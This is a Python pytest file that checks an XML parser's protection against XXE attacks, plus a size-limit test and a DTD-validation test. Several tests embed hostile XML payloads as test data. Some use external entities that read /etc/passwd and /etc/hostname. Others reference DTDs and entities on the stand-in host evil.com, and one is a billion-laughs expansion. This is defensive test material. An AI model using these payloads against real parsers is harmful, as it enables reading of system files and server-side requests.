"""Tests for XXE protection in PHP generator."""

import tempfile
from pathlib import Path

import pytest
from lxml import etree

from xml_lib.php.parser import ParseConfig, ParseError, SecureXMLParser


def test_xxe_external_entity_blocked():
    """Test that external entity declarations are blocked by default."""
    xxe_xml = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
"""

    with tempfile.NamedTemporaryFile(mode="w", suffix=".xml", delete=False) as f:
        f.write(xxe_xml)
        temp_path = Path(f.name)

    try:
        parser = SecureXMLParser()
        root = parser.parse_string(xxe_xml)

        # Entity should not be resolved - should be empty or raise error
        # lxml with resolve_entities=False will not expand the entity
        text_content = root.text or ""

        # The entity reference should NOT be resolved to file contents
        assert "/etc/passwd" not in text_content
        assert "root:" not in text_content  # Common in passwd file

    finally:
        temp_path.unlink(missing_ok=True)


def test_xxe_external_dtd_blocked():
    """Test that external DTD references are blocked."""
    xxe_xml = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root SYSTEM "http://evil.com/evil.dtd">
<root>test</root>
"""

    parser = SecureXMLParser()

    # Should not make network request or load external DTD
    # With no_network=True and load_dtd=False, this should be safe
    try:
        root = parser.parse_string(xxe_xml)
        # If it parses, the DTD was not loaded (which is good)
        assert root.tag == "root"
    except (ParseError, etree.XMLSyntaxError):
        # Some configurations might reject this entirely, which is also fine
        pass


def test_xxe_parameter_entity_blocked():
    """Test that parameter entities are blocked."""
    xxe_xml = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  %xxe;
]>
<root>test</root>
"""

    parser = SecureXMLParser()

    try:
        root = parser.parse_string(xxe_xml)
        # Should parse without resolving the parameter entity
        assert root.tag == "root"
    except (ParseError, etree.XMLSyntaxError):
        # Rejecting entirely is also acceptable
        pass


def test_billion_laughs_attack_prevented():
    """Test protection against billion laughs (exponential entity expansion)."""
    # Simplified billion laughs attack
    xxe_xml = """<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<root>&lol3;</root>
"""

    parser = SecureXMLParser()

    # With huge_tree=False and resolve_entities=False, this should be blocked
    try:
        root = parser.parse_string(xxe_xml)
        # If it parses, entities should not be expanded
        text = root.text or ""
        # Should not have massive expansion
        assert len(text) < 1000  # If expanded, would be much larger
    except (ParseError, etree.XMLSyntaxError):
        # Rejection is also acceptable
        pass


def test_network_access_disabled():
    """Test that network access is disabled."""
    # XML trying to load from network
    xxe_xml = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://evil.com/malicious.xml">
]>
<root>&xxe;</root>
"""

    parser = SecureXMLParser()

    # Should not make network request with no_network=True
    try:
        root = parser.parse_string(xxe_xml)
        # If it parses, entity should not be resolved
        text = root.text or ""
        assert "malicious" not in text.lower()
    except (ParseError, etree.XMLSyntaxError):
        # Rejection is also acceptable
        pass


def test_secure_parser_with_file(tmp_path):
    """Test that secure parser works correctly with normal XML files."""
    xml_file = tmp_path / "test.xml"
    xml_file.write_text("""<?xml version="1.0" encoding="UTF-8"?>
<document>
  <title>Test Document</title>
  <content>This is safe content</content>
</document>
""")

    parser = SecureXMLParser()
    root = parser.parse(xml_file)

    assert root.tag == "document"
    assert root.find("title").text == "Test Document"
    assert root.find("content").text == "This is safe content"


def test_size_limit_enforced():
    """Test that file size limits are enforced."""
    # Create XML larger than limit
    large_content = "x" * (5 * 1024 * 1024)  # 5MB of content
    xml = f'<?xml version="1.0"?><root>{large_content}</root>'

    config = ParseConfig(max_size_bytes=1024 * 1024)  # 1MB limit
    parser = SecureXMLParser(config)

    with pytest.raises(ParseError, match="too large"):
        parser.parse_string(xml)


def test_parse_timeout_enforced():
    """Test that parse time limits are enforced."""
    # This test is tricky because we need genuinely slow XML
    # For now, just verify the config is used
    config = ParseConfig(max_parse_time_seconds=0.001)  # Very short timeout
    parser = SecureXMLParser(config)

    # Normal XML should still parse if it's fast enough
    quick_xml = '<?xml version="1.0"?><root>test</root>'
    root = parser.parse_string(quick_xml)
    assert root.tag == "root"


def test_dtd_validation_disabled():
    """Test that DTD validation is disabled by default."""
    # XML with DTD that would normally be validated
    xml_with_dtd = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE note [
  <!ELEMENT note (to,from,heading,body)>
  <!ELEMENT to (#PCDATA)>
  <!ELEMENT from (#PCDATA)>
  <!ELEMENT heading (#PCDATA)>
  <!ELEMENT body (#PCDATA)>
]>
<note>
  <to>User</to>
  <from>Admin</from>
  <heading>Test</heading>
  <body>Message</body>
</note>
"""

    parser = SecureXMLParser()

    # Should parse without validating against DTD
    root = parser.parse_string(xml_with_dtd)
    assert root.tag == "note"


def test_entity_substitution_blocked():
    """Test that entity substitution is blocked."""
    xml = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY company "Evil Corp">
]>
<root>
  <name>&company;</name>
</root>
"""

    parser = SecureXMLParser()
    root = parser.parse_string(xml)

    # With resolve_entities=False, entities should not be expanded
    # The entity reference might be preserved or empty
    name_text = root.find("name").text or ""
    assert "Evil Corp" not in name_text or name_text == ""


def test_comments_and_formatting_preserved():
    """Test that comments and formatting are preserved in secure mode."""
    xml = """<?xml version="1.0" encoding="UTF-8"?>
<root>
  <!-- This is a comment -->
  <element>value</element>
</root>
"""

    parser = SecureXMLParser()
    root = parser.parse_string(xml)

    # Comments should be preserved (remove_comments=False)
    assert root.tag == "root"
    # Note: etree might strip comments in fromstring, but they're preserved in parse()


def test_xxe_with_file_wrapper():
    """Test XXE protection with file:// wrapper."""
    xxe_xml = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY file SYSTEM "file:///etc/hostname">
]>
<root>
  <data>&file;</data>
</root>
"""

    parser = SecureXMLParser()
    root = parser.parse_string(xxe_xml)

    data_text = root.find("data").text or ""
    # Should not contain actual hostname
    assert len(data_text) < 10  # Hostname would be some length, entity ref should be empty
